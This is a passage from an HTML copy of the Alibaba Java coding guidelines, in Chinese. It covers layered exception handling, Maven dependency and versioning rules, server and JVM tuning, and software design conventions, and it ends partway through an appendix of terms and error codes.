<p>2） 对 Service 层通用能力的下沉，如缓存方案、中间件通用处理。</p>
<p>3） 与 DAO 层交互，对多个 DAO 的组合复用。</p>
</li>
<li>
<p>DAO 层：数据访问层，与底层 MySQL、Oracle、Hbase、OB 等进行数据交互。</p>
</li>
<li>
<p>第三方服务：包括其它部门 RPC 服务接口，基础平台，其它公司的 HTTP 接口，如淘宝开放平台、支 付宝付款服务、高德地图服务等。</p>
</li>
<li>
<p>外部数据接口：外部（应用）数据存储服务提供的接口，多见于数据迁移场景中。</p>
</li>
</ul>
</li>
<li>
<p><font color="#76923C">【参考】</font>（分层异常处理规约）在 DAO 层，产生的异常类型有很多，无法用细粒度的异常进行 catch，使用 ==catch(Exception e)方式，并 throw new DAOException(e)==，不需要打印日志，因 为日志在 Manager/Service 层一定需要捕获并打印到日志文件中去，如果同台服务器再打日志，浪费性能和存储。在 Service 层出现异常时，必须记录出错日志到磁盘，尽可能带上参数信息， 相当于保护案发现场。Manager 层与 Service 同机部署，日志方式与 DAO 层处理一致，如果是 单独部署，则采用与 Service 一致的处理方式。Web 层绝不应该继续往上抛异常，因为已经处于顶层，如果意识到这个异常将导致页面无法正常渲染，那么就应该直接跳转到友好错误页面， 尽量加上友好的错误提示信息。开放接口层要将异常处理成错误码和错误信息方式返回。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>分层领域模型规约：</p>
<ul>
<li>
<p>DO（Data Object）：此对象与数据库表结构一一对应，通过 DAO 层向上传输数据源对象。</p>
</li>
<li>
<p>DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。</p>
</li>
<li>
<p>BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。</p>
</li>
<li>
<p>Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类 来传输。</p>
</li>
<li>
<p>VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。</p>
</li>
</ul>
</li>
</ol>
<h2 id="二-二方库依赖">(二)  二方库依赖</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>定义 GAV遵从以下规则：</p>
<ul>
<li>
<p><strong>GroupID 格式</strong>：com.{公司/BU }.业务线  [.子业务线]，最多 4 级。</p>
<p><font color=" #977C00">说明：</font>{公司/BU}  例如：alibaba/taobao/tmall/aliexpress 等 BU 一级；子业务线可选。</p>
<p><font color="#019858">正例：</font>com.taobao.jstorm  或 com.alibaba.dubbo.register</p>
</li>
<li>
<p><strong>ArtifactID 格式</strong>：产品线名-模块名。语义不重复不遗漏，先到中央仓库去查证一下。</p>
<p><font color="#019858">正例：</font>dubbo-client / fastjson-api / jstorm-tool</p>
</li>
<li>
<p><strong>Version</strong>：详细规定参考下方。</p>
</li>
</ul>
</li>
<li>
<p><font color=" #C00000">【强制】</font>二方库版本号命名方式：主版本号.次版本号.修订号</p>
<p>1）主版本号：产品方向改变，或者大规模 API 不兼容，或者架构不兼容升级。</p>
<p>2） 次版本号：保持相对兼容性，增加主要功能特性，影响范围极小的 API 不兼容修改。</p>
<p>3） 修订号：保持完全兼容性，修复 BUG、新增次要功能特性等。</p>
<p><font color=" #977C00">说明：</font>注意起始版本号必须为：1.0.0，而不是 0.0.1。</p>
<p><font color=" #FF4500">反例：</font>仓库内某二方库版本号从 1.0.0.0 开始，一直默默“升级”成 1.0.0.64，完全失去版本的语义信息。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>线上应用不要依赖 SNAPSHOT 版本（安全包除外）；正式发布的类库必须先去中央仓 库进行查证，使 RELEASE版本号有延续性，且版本号不允许覆盖升级。</p>
<p><font color=" #977C00">说明：</font>不依赖 SNAPSHOT 版本是保证应用发布的幂等性。另外，也可以加快编译时的打包构建。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>二方库的新增或升级，保持除功能点之外的其它 jar 包仲裁结果不变。如果有改变， 必须明确评估和验证。</p>
<p><font color=" #977C00">说明：</font>在升级时，进行 dependency:resolve 前后信息比对，如果仲裁结果完全不一致，那么通过 dependency:tree 命令，找出差异点，进行<code>&lt;exclude&gt;</code>排除 jar 包。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>二方库里可以定义枚举类型，参数可以使用枚举类型，但是接口返回值不允许使用枚举类型或者包含枚举类型的 POJO 对象。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>依赖于一个二方库群时，必须定义一个统一的版本变量，避免版本号不一致。</p>
<p><font color=" #977C00">说明：</font>依赖 springframework-core,-context,-beans，它们都是同一个版本，可以定义一个变量来保存版本：${spring.version}，定义依赖的时候，引用该版本。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>禁止在子项目的 pom 依赖中出现相同的 GroupId，相同的 ArtifactId，但是不同的 Version。</p>
<p><font color=" #977C00">说明：</font>在本地调试时会使用各子项目指定的版本号，但是合并成一个 war，只能有一个版本号出现在最后的 lib 目录中。曾经出现过线下调试是正确的，发布到线上却出故障的先例。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>底层基础技术框架、核心数据管理平台、或近硬件端系统谨慎引入第三方实现。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>所有 pom 文件中的依赖声明放在<code>&lt;dependencies&gt;</code>语句块中，所有版本仲裁放在<code>&lt;dependencyManagement&gt;</code>语句块中。</p>
<p><font color=" #977C00">说明：</font><code>&lt;dependencyManagement&gt;</code>里只是声明版本，并不实现引入，因此子项目需要显式的声明依赖， version 和 scope 都读取自父 pom。而<code>&lt;dependencies&gt;</code>所有声明在主 pom 的<code>&lt;dependencies&gt;</code>的依赖都会自动引入，并默认被所有的子项目继承。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>二方库不要有配置项，最低限度不要再增加配置项。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不要使用不稳定的工具包或者 Utils 类。</p>
<p><font color=" #977C00">说明：</font>不稳定指的是提供方无法做到向下兼容，在编译阶段正常，但在运行时产生异常，因此，尽量使用 业界稳定的二方工具包。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>为避免应用二方库的依赖冲突问题，二方库发布者应当遵循以下原则：</p>
<p>1）<strong>精简可控原则</strong>。移除一切不必要的 API 和依赖，只包含  Service API、必要的领域模型对象、Utils 类、 常量、枚举等。如果依赖其它二方库，尽量是 provided 引入，让二方库使用者去依赖具体版本号；无 log 具体实现，只依赖日志框架。2）<strong>稳定可追溯原则</strong>。每个版本的变化应该被记录，二方库由谁维护，源码在哪里，都需要能方便查到。除非用户主动升级版本，否则公共二方库的行为不应该发生变化。</p>
</li>
</ol>
<h2 id="三-服务器">(三)  服务器</h2>
<ol>
<li>
<p><font color=" #FFC000">【推荐】</font>高并发服务器建议调小TCP 协议的 time_wait 超时时间。</p>
<p><font color=" #977C00">说明：</font>操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接，在高并发访问下，服务器端会因为 处于 time_wait 的连接数太多，可能无法建立新的连接，所以需要在服务器上调小此等待值。</p>
<p><font color="#019858">正例：</font>在 linux 服务器上请通过变更<code>/etc/sysctl.conf </code>文件去修改该缺省值（秒）：  <code>net.ipv4.tcp\_fin\_timeout = 30</code></p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>调大服务器所支持的最大文件句柄数（File Descriptor，简写为 fd）。</p>
<p><font color=" #977C00">说明：</font>主流操作系统的设计是将 TCP/UDP 连接采用与文件一样的方式去管理，即一个连接对应于一个 fd。 主流的 linux 服务器默认所支持最大 fd 数量为 1024，当并发连接数很大时很容易因为 fd 不足而出现“open too many files”错误，导致新的连接无法建立。建议将 linux 服务器所支持的最大句柄数调高数倍（与服务器的内存数量相关）。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>给 JVM环境参数设置<code>-XX:+HeapDumpOnOutOfMemoryError</code>参数，让 JVM碰到 OOM 场景时输出 dump 信息。</p>
<p><font color=" #977C00">说明：</font>OOM 的发生是有概率的，甚至相隔数月才出现一例，出错时的堆内信息对解决问题非常有帮助。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>在线上生产环境，JVM 的 Xms 和 Xmx 设置一样大小的内存容量，避免在 GC  后调整堆大小带来的压力。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>服务器内部重定向必须使用 forward；外部重定向地址必须使用 URL Broker 生成，否 则因线上采用 HTTPS 协议而导致浏览器提示“不安全“。此外，还会带来 URL维护不一致的 问题。</p>
</li>
</ol>
<h1>七、设计规约</h1>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>存储方案和底层数据结构的设计获得评审一致通过，并沉淀成为文档。</p>
<p><font color=" #977C00">说明：</font>有缺陷的底层数据结构容易导致系统风险上升，可扩展性下降，重构成本也会因历史数据迁移和系 统平滑过渡而陡然增加，所以，存储方案和数据结构需要认真地进行设计和评审，生产环境提交执行后， 需要进行 double check。</p>
<p><font color="#019858">正例：</font>评审内容包括存储介质选型、表结构设计能否满足技术方案、存取性能和存储空间能否满足业务发 展、表或字段之间的辩证关系、字段名称、字段类型、索引等；数据结构变更（如在原有表中新增字段） 也需要进行评审通过后上线。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在需求分析阶段，如果与系统交互的 User 超过一类并且相关的 User Case 超过 5 个， 使用用例图来表达更加清晰的结构化需求。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如果某个业务对象的状态超过 3 个，使用状态图来表达并且明确状态变化的各个触发 条件。</p>
<p><font color=" #977C00">说明：</font>状态图的核心是对象状态，首先明确对象有多少种状态，然后明确两两状态之间是否存在直接转换 关系，再明确触发状态转换的条件是什么。</p>
<p><font color="#019858">正例：</font>淘宝订单状态有已下单、待付款、已付款、待发货、已发货、已收货等。比如已下单与已收货这两 种状态之间是不可能有直接转换关系的。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如果系统中某个功能的调用链路上的涉及对象超过 3 个，使用时序图来表达并且明确 各调用环节的输入与输出。    <font color=" #977C00">说明：</font>时序图反映了一系列对象间的交互与协作关系，清晰立体地反映系统的调用纵深链路。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如果系统中模型类超过 5 个，并且存在复杂的依赖关系，使用类图来表达并且明确类之间的关系。</p>
<p><font color=" #977C00">说明：</font>类图像建筑领域的施工图，如果搭平房，可能不需要，但如果建造空间大楼，肯定需要详细的施工图。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>如果系统中超过 2 个对象之间存在协作关系，并且需要表示复杂的处理流程，使用活动图来表示。</p>
<p><font color=" #977C00">说明：</font>活动图是流程图的扩展，增加了能够体现协作关系的对象泳道，支持表示并发等。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>系统架构设计时明确以下目标：</p>
<ul>
<li>
<p>确定系统边界。确定系统在技术层面上的做与不做。</p>
</li>
<li>
<p>确定系统内模块之间的关系。确定模块之间的依赖关系及模块的宏观输入与输出。</p>
</li>
<li>
<p>确定指导后续设计与演化的原则。使后续的子系统或模块设计在一个既定的框架内和技术方向上继 续演化。</p>
</li>
<li>
<p>确定非功能性需求。非功能性需求是指安全性、可用性、可扩展性等。</p>
</li>
</ul>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>需求分析与系统设计在考虑主干功能的同时，需要充分评估异常流程与业务边界。</p>
<p><font color=" #FF4500">反例：</font>用户在淘宝付款过程中，银行扣款成功，发送给用户扣款成功短信，但是支付宝入款时由于断网演 练产生异常，淘宝订单页面依然显示未付款，导致用户投诉。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>类在设计与实现时要符合单一原则。</p>
<p><font color=" #977C00">说明：</font>单一原则最易理解却是最难实现的一条规则，随着系统演进，很多时候，忘记了类设计的初衷。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>谨慎使用继承的方式来进行扩展，优先使用聚合/组合的方式来实现。</p>
<p><font color=" #977C00">说明：</font>不得已使用继承的话，必须符合里氏代换原则，此原则说父类能够出现的地方子类一定能够出现， 比如，“把钱交出来”，钱的子类美元、欧元、人民币等都可以出现。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>系统设计阶段，根据依赖倒置原则，尽量依赖抽象类与接口，有利于扩展与维护。</p>
<p><font color=" #977C00">说明：</font>低层次模块依赖于高层次模块的抽象，方便系统间的解耦。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>系统设计阶段，注意对扩展开放，对修改闭合。</p>
<p><font color=" #977C00">说明：</font>极端情况下，交付的代码是不可修改的，同一业务域内的需求变化，通过模块或类的扩展来实现。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>系统设计阶段，共性业务或公共行为抽取出来公共模块、公共配置、公共类、公共方 法等，在系统中不出现重复代码的情况，即 DRY原则（Don’t Repeat Yourself）。</p>
<p><font color=" #977C00">说明：</font>随着代码的重复次数不断增加，维护成本指数级上升。随意复制和粘贴代码，必然会导致代码的重复， 在维护代码时，需要修改所有的副本，容易遗漏。必要时抽取共性方法，或者抽象公共类，甚至是组件化。</p>
<p><font color="#019858">正例：</font>一个类中有多个 public 方法，都需要进行数行相同的参数校验操作，这个时候请抽取：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">checkParam</span><span class="token punctuation">(</span><span class="token class-name">DTO</span> dto<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>避免如下误解：敏捷开发  =  讲故事  +  编码  +  发布。</p>
<p><font color=" #977C00">说明：</font>敏捷开发是快速交付迭代可用的系统，省略多余的设计方案，摒弃传统的审批流程，但核心关键点上 的必要设计和文档沉淀是需要的。</p>
<p><font color=" #FF4500">反例：</font>某团队为了业务快速发展，敏捷成了产品经理催进度的借口，系统中均是勉强能运行但像面条一样 的代码，可维护性和可扩展性极差，一年之后，不得不进行大规模重构，得不偿失。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>设计文档的作用是明确需求、理顺逻辑、后期维护，次要目的用于指导编码。</p>
<p><font color=" #977C00">说明：</font>避免为了设计而设计，系统设计文档有助于后期的系统维护和重构，所以设计结果需要进行分类归 档保存。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>可扩展性的本质是找到系统的变化点，并隔离变化点。</p>
<p><font color=" #977C00">说明：</font>世间众多设计模式其实就是一种设计模式即隔离变化点的模式。</p>
<p><font color="#019858">正例：</font>极致扩展性的标志，就是需求的新增，不会在原有代码交付物上进行任何形式的修改。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>设计的本质就是识别和表达系统难点。</p>
<p><font color=" #977C00">说明：</font>识别和表达完全是两回事，很多人错误地认为识别到系统难点在哪里，表达只是自然而然的事情， 但是大家在设计评审中经常出现语焉不详，甚至是词不达意的情况。准确地表达系统难点需要具备如下能 力：  表达规则和表达工具的熟练性。抽象思维和总结能力的局限性。基础知识体系的完备性。深入浅出的 生动表达力。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>代码即文档的观点是错误的，清晰的代码只是文档的某个片断，而不是全部。</p>
<p><font color=" #977C00">说明：</font>代码的深度调用，模块层面上的依赖关系网，业务场景逻辑，非功能性需求等问题是需要相应的文 档来完整地呈现的。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>在做无障碍产品设计时，需要考虑到：</p>
<ul>
<li>
<p>所有可交互的控件元素必须能被 tab 键聚焦，并且焦点顺序需符合自然操作逻辑。</p>
</li>
<li>
<p>用于登录校验和请求拦截的验证码均需提供图形验证以外的其它方式。</p>
</li>
<li>
<p>自定义的控件类型需明确交互方式。</p>
</li>
</ul>
<p><font color="#019858">正例：</font>用户登录场景中，输入框的按钮都需要考虑 tab 键聚焦，符合自然逻辑的操作顺序如下，“输入用 户名，输入密码，输入验证码，点击登录”，其中验证码实现语音验证方式。如果有自定义标签实现的控 件设置控件类型可使用 role 属性。</p>
</li>
</ol>
<h1>附录</h1>
<h2 id="附录1：专有名词解释">附录1：专有名词解释</h2>
<ol>
<li>POJO（Plain Ordinary Java Object）:  在本规约中，POJO 专指只有 setter/getter/toString 的 简单类，包括 DO/DTO/BO/VO 等。</li>
<li>DO（Data Object）：阿里巴巴专指数据库表一一对应的 POJO 类。此对象与数据库表结构一 一对应，通过 DAO 层向上传输数据源对象。</li>
<li>DTO（Data Transfer Object）：数据传输对象，Service 或 Manager 向外传输的对象。</li>
<li>BO（Business Object）：业务对象，可以由 Service 层输出的封装业务逻辑的对象。</li>
<li>Query：数据查询对象，各层接收上层的查询请求。注意超过 2 个参数的查询封装，禁止使用 Map 类来传输。</li>
<li>VO（View Object）：显示层对象，通常是 Web 向模板渲染引擎层传输的对象。</li>
<li>AO（Application Object）:  阿里巴巴专指 Application Object，即在 Service 层上，极为贴近 业务的复用代码。</li>
<li>CAS（Compare And Swap）：解决多线程并行情况下使用锁造成性能损耗的一种机制，这是 硬件实现的原子操作。CAS 操作包含三个操作数：内存位置、预期原值和新值。如果内存位 置的值与预期原值相匹配，那么处理器会自动将该位置值更新为新值。否则，处理器不做任何 操作。</li>
<li>GAV（GroupId、ArtifactId、Version）: Maven 坐标，是用来唯一标识 jar 包。</li>
<li>OOP（Object Oriented Programming）:  本文泛指类、对象的编程处理方式。</li>
<li>AQS（AbstractQueuedSynchronizer）:  利用先进先出队列实现的底层同步工具类，它是很多上 层同步实现类的基础，比如：ReentrantLock、CountDownLatch、Semaphore 等，它们通 过继承 AQS 实现其模版方法，然后将 AQS 子类作为同步组件的内部类，通常命名为 Sync。</li>
<li>ORM（Object Relation Mapping）:  对象关系映射，对象领域模型与底层数据之间的转换，本 文泛指 iBATIS, mybatis 等框架。</li>
<li>NPE（java.lang.NullPointerException）:  空指针异常。</li>
<li>OOM（Out Of Memory）:  源于  java.lang.OutOfMemoryError，当  JVM  没有足够的内存 来为对象分配空间并且垃圾回收器也无法回收空间时，系统出现的严重状况。</li>
<li>一方库: 本工程内部子项目模块依赖的库（jar 包）。</li>
<li>二方库: 公司内部发布到中央仓库，可供公司内部其它应用依赖的库（jar 包）。</li>
<li>三方库: 公司之外的开源库（jar 包）。</li>
</ol>
<h2 id="附录2：错误码列表">附录2：错误码列表</h2>
<table>
<thead>
<tr>
<th>错误码</th>
<th>中文描述</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>00000</td>
<td>一切 ok</td>
<td>正确执行后的返回</td>
</tr>
<tr>
<td>A0001</td>
<td>用户端错误</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>A0100</td>
<td>用户注册错误</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0101</td>
<td>用户未同意隐私协议</td>
<td></td>
</tr>
<tr>
<td>A0102</td>
<td>注册国家或地区受限</td>
<td></td>
</tr>
<tr>
<td>A0110</td>
<td>用户名校验失败</td>
<td></td>
</tr>
<tr>
<td>A0111</td>
<td>用户名已存在</td>
<td></td>
</tr>
<tr>
<td>A0112</td>
<td>用户名包含敏感词</td>
<td></td>
</tr>
<tr>
<td>A0113</td>
<td>用户名包含特殊字符</td>
<td></td>
</tr>
<tr>
<td>A0120</td>
<td>密码校验失败</td>
<td></td>
</tr>
<tr>
<td>A0121</td>
<td>密码长度不够</td>
<td></td>
</tr>
<tr>
<td>A0122</td>
<td>密码强度不够</td>
<td></td>
</tr>
<tr>
<td>A0130</td>
<td>校验码输入错误</td>
<td></td>
</tr>
<tr>
<td>A0131</td>
<td>短信校验码输入错误</td>
<td></td>
</tr>
<tr>
<td>A0132</td>
<td>邮件校验码输入错误</td>
<td></td>
</tr>
<tr>
<td>A0133</td>
<td>语音校验码输入错误</td>
<td></td>
</tr>
<tr>
<td>A0140</td>
<td>用户证件异常</td>
<td></td>
</tr>
<tr>
<td>A0141</td>
<td>用户证件类型未选择</td>
<td></td>
</tr>
<tr>
<td>A0142</td>
<td>大陆身份证编号校验非法</td>
<td></td>
</tr>
<tr>
<td>A0143</td>
<td>护照编号校验非法</td>
<td></td>
</tr>
<tr>
<td>A0144</td>
<td>军官证编号校验非法</td>
<td></td>
</tr>
<tr>
<td>A0150</td>
<td>用户基本信息校验失败</td>
<td></td>
</tr>
<tr>
<td>A0151</td>
<td>手机格式校验失败</td>
<td></td>
</tr>
<tr>
<td>A0152</td>
<td>地址格式校验失败</td>
<td></td>
</tr>
<tr>
<td>A0153</td>
<td>邮箱格式校验失败</td>
<td></td>
</tr>
<tr>
<td>A0200</td>
<td>用户登录异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0201</td>
<td>用户账户不存在</td>
<td></td>
</tr>
<tr>
<td>A0202</td>
<td>用户账户被冻结</td>
<td></td>
</tr>
<tr>
<td>A0203</td>
<td>用户账户已作废</td>
<td></td>
</tr>
<tr>
<td>A0210</td>
<td>用户密码错误</td>
<td></td>
</tr>
<tr>
<td>A0211</td>
<td>用户输入密码错误次数超限</td>
<td></td>
</tr>
<tr>
<td>A0220</td>
<td>用户身份校验失败</td>
<td></td>
</tr>
<tr>
<td>A0221</td>
<td>用户指纹识别失败</td>
<td></td>
</tr>
<tr>
<td>A0222</td>
<td>用户面容识别失败</td>
<td></td>
</tr>
<tr>
<td>A0223</td>
<td>用户未获得第三方登录授权</td>
<td></td>
</tr>
<tr>
<td>A0230</td>
<td>用户登录已过期</td>
<td></td>
</tr>
<tr>
<td>A0240</td>
<td>用户验证码错误</td>
<td></td>
</tr>
<tr>
<td>A0241</td>
<td>用户验证码尝试次数超限</td>
<td></td>
</tr>
<tr>
<td>A0300</td>
<td>访问权限异常</td>
<td></td>
</tr>
<tr>
<td>A0301</td>
<td>访问未授权</td>
<td></td>
</tr>
<tr>
<td>A0302</td>
<td>正在授权中</td>
<td></td>
</tr>
<tr>
<td>A0303</td>
<td>用户授权申请被拒绝</td>
<td></td>
</tr>
<tr>
<td>A0310</td>
<td>因访问对象隐私设置被拦截</td>
<td></td>
</tr>
<tr>
<td>A0311</td>
<td>授权已过期</td>
<td></td>
</tr>
<tr>
<td>A0312</td>
<td>无权限使用API</td>
<td></td>
</tr>
<tr>
<td>A0320</td>
<td>用户访问被拦截</td>
<td></td>
</tr>
<tr>
<td>A0321</td>
<td>黑名单用户</td>
<td></td>
</tr>
<tr>
<td>A0322</td>
<td>账号被冻结</td>
<td></td>
</tr>
<tr>
<td>A0323</td>
<td>非法IP地址</td>
<td></td>
</tr>
<tr>
<td>A0324</td>
<td>网关访问受限</td>
<td></td>
</tr>
<tr>
<td>A0325</td>
<td>地域黑名单</td>
<td></td>
</tr>
<tr>
<td>A0330</td>
<td>服务已欠费</td>
<td></td>
</tr>
<tr>
<td>A0340</td>
<td>用户签名异常</td>
<td></td>
</tr>
<tr>
<td>A0341</td>
<td>RSA签名错误</td>
<td></td>
</tr>
<tr>
<td>A0400</td>
<td>用户请求参数错误</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0401</td>
<td>包含非法恶意跳转链接</td>
<td></td>
</tr>
<tr>
<td>A0402</td>
<td>无效的用户输入</td>
<td></td>
</tr>
<tr>
<td>A0410</td>
<td>请求必填参数为空</td>
<td></td>
</tr>
<tr>
<td>A0411</td>
<td>用户订单号为空</td>
<td></td>
</tr>
<tr>
<td>A0412</td>
<td>订购数量为空</td>
<td></td>
</tr>
<tr>
<td>A0413</td>
<td>缺少时间戳参数</td>
<td></td>
</tr>
<tr>
<td>A0414</td>
<td>非法的时间戳参数</td>
<td></td>
</tr>
<tr>
<td>A0420</td>
<td>请求参数值超出允许的范围</td>
<td></td>
</tr>
<tr>
<td>A0421</td>
<td>参数格式不匹配</td>
<td></td>
</tr>
<tr>
<td>A0422</td>
<td>地址不在服务范围</td>
<td></td>
</tr>
<tr>
<td>A0423</td>
<td>时间不在服务范围</td>
<td></td>
</tr>
<tr>
<td>A0424</td>
<td>金额超出限制</td>
<td></td>
</tr>
<tr>
<td>A0425</td>
<td>数量超出限制</td>
<td></td>
</tr>
<tr>
<td>A0426</td>
<td>请求批量处理总个数超出限制</td>
<td></td>
</tr>
<tr>
<td>A0427</td>
<td>请求 JSON 解析失败</td>
<td></td>
</tr>
<tr>
<td>A0430</td>
<td>用户输入内容非法</td>
<td></td>
</tr>
<tr>
<td>A0431</td>
<td>包含违禁敏感词</td>
<td></td>
</tr>
<tr>
<td>A0432</td>
<td>图片包含违禁信息</td>
<td></td>
</tr>
<tr>
<td>A0433</td>
<td>文件侵犯版权</td>
<td></td>
</tr>
<tr>
<td>A0440</td>
<td>用户操作异常</td>
<td></td>
</tr>
<tr>
<td>A0441</td>
<td>用户支付超时</td>
<td></td>
</tr>
<tr>
<td>A0442</td>
<td>确认订单超时</td>
<td></td>
</tr>
<tr>
<td>A0443</td>
<td>订单已关闭</td>
<td></td>
</tr>
<tr>
<td>A0500</td>
<td>用户请求服务异常</td>
<td></td>
</tr>
<tr>
<td>A0501</td>
<td>请求次数超出限制</td>
<td></td>
</tr>
<tr>
<td>A0502</td>
<td>请求并发数超出限制</td>
<td></td>
</tr>
<tr>
<td>A0503</td>
<td>用户操作请等待</td>
<td></td>
</tr>
<tr>
<td>A0504</td>
<td>WebSocket 连接异常</td>
<td></td>
</tr>
<tr>
<td>A0505</td>
<td>WebSocket 连接断开</td>
<td></td>
</tr>
<tr>
<td>A0506</td>
<td>用户重复请求</td>
<td></td>
</tr>
<tr>
<td>A0600</td>
<td>用户资源异常</td>
<td></td>
</tr>
<tr>
<td>A0601</td>
<td>账户余额不足</td>
<td></td>
</tr>
<tr>
<td>A0602</td>
<td>用户磁盘空间不足</td>
<td></td>
</tr>
<tr>
<td>A0603</td>
<td>用户内存空间不足</td>
<td></td>
</tr>
<tr>
<td>A0604</td>
<td>用户 OSS 容量不足</td>
<td></td>
</tr>
<tr>
<td>A0605</td>
<td>用户配额已用光</td>
<td></td>
</tr>
<tr>
<td>A0700</td>
<td>用户上传文件异常</td>
<td></td>
</tr>
<tr>
<td>A0701</td>
<td>用户上传文件类型不匹配</td>
<td></td>
</tr>
<tr>
<td>A0702</td>
<td>用户上传文件太大</td>
<td></td>
</tr>
<tr>
<td>A0703</td>
<td>用户上传图片太大</td>
<td></td>
</tr>
<tr>
<td>A0704</td>
<td>用户上传视频太大</td>
<td></td>
</tr>
<tr>
<td>A0705</td>
<td>用户上传压缩文件太大</td>
<td></td>
</tr>
<tr>
<td>A0800</td>
<td>用户当前版本异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0801</td>
<td>用户安装版本与系统不匹配</td>
<td></td>
</tr>
<tr>
<td>A0802</td>
<td>用户安装版本过低</td>
<td></td>
</tr>
<tr>
<td>A0803</td>
<td>用户安装版本过高</td>
<td></td>
</tr>
<tr>
<td>A0804</td>
<td>用户安装版本已过期</td>
<td></td>
</tr>
<tr>
<td>A0805</td>
<td>用户 API 请求版本不匹配</td>
<td></td>
</tr>
<tr>
<td>A0806</td>
<td>用户 API 请求版本过高</td>
<td></td>
</tr>
<tr>
<td>A0807</td>
<td>用户 API 请求版本过低</td>
<td></td>
</tr>
<tr>
<td>A0900</td>
<td>用户隐私未授权</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0901</td>
<td>用户隐私未签署</td>
<td></td>
</tr>
<tr>
<td>A0902</td>
<td>用户摄像头未授权</td>
<td></td>
</tr>
<tr>
<td>A0903</td>
<td>用户相机未授权</td>
<td></td>
</tr>
<tr>
<td>A0904</td>
<td>用户图片库未授权</td>
<td></td>
</tr>
<tr>
<td>A0905</td>
<td>用户文件未授权</td>
<td></td>
</tr>
<tr>
<td>A0906</td>
<td>用户位置信息未授权</td>
<td></td>
</tr>
<tr>
<td>A0907</td>
<td>用户通讯录未授权</td>
<td></td>
</tr>
<tr>
<td>A1000</td>
<td>用户设备异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A1001</td>
<td>用户相机异常</td>
<td></td>
</tr>
<tr>
<td>A1002</td>
<td>用户麦克风异常</td>
<td></td>
</tr>
<tr>
<td>A1003</td>
<td>用户听筒异常</td>
<td></td>
</tr>
<tr>
<td>A1004</td>
<td>用户扬声器异常</td>
<td></td>
</tr>
<tr>
<td>A1005</td>
<td>用户 GPS 定位异常</td>
<td></td>
</tr>
<tr>
<td>B0001</td>
<td>系统执行出错</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>B0100</td>
<td>系统执行超时</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0101</td>
<td>系统订单处理超时</td>
<td></td>
</tr>
<tr>
<td>B0200</td>
<td>系统容灾功能被触发</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0210</td>
<td>系统限流</td>
<td></td>
</tr>
<tr>
<td>B0220</td>
<td>系统功能降级</td>
<td></td>
</tr>
<tr>
<td>B0300</td>
<td>系统资源异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0310</td>
<td>系统资源耗尽</td>
<td></td>
</tr>
<tr>
<td>B0311</td>
<td>系统磁盘空间耗尽</td>
<td></td>
</tr>
<tr>
<td>B0312</td>
<td>系统内存耗尽</td>
<td></td>
</tr>
<tr>
<td>B0313</td>
<td>文件句柄耗尽</td>
<td></td>
</tr>
<tr>
<td>B0314</td>
<td>系统连接池耗尽</td>
<td></td>
</tr>
<tr>
<td>B0315</td>
<td>系统线程池耗尽</td>
<td></td>
</tr>
<tr>
<td>B0320</td>
<td>系统资源访问异常</td>
<td></td>
</tr>
<tr>
<td>B0321</td>
<td>系统读取磁盘文件失败</td>
<td></td>
</tr>
<tr>
<td>C0001</td>
<td>调用第三方服务出错</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>C0100</td>
